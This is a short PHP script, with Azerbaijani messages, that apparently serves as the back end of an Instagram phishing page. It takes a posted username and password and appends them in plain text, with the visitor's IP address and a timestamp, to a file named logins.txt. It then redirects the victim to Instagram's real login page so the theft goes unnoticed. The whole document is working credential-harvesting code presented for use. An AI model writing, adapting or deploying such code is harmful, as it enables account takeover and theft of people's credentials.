<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = trim($_POST['username'] ?? '');
    $password = trim($_POST['password'] ?? '');

    if (strlen($username) < 3 || strlen($password) < 6) {
        echo "Daxil etdiyiniz məlumatlar düzgün deyil.";
        exit;
    }

    function getUserIP() {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            return $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
        } else {
            return $_SERVER['REMOTE_ADDR'];
        }
    }

    $ip = getUserIP();

    $file = 'logins.txt'; 
    $data = "IP: $ip | Username: $username | Password: $password | Time: " . date('Y-m-d H:i:s') . "\n";

    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

    header("Location: https://www.instagram.com/accounts/login/");
    exit;
} else {
    echo "Yalnız POST sorğuları qəbul olunur.";
}
?>
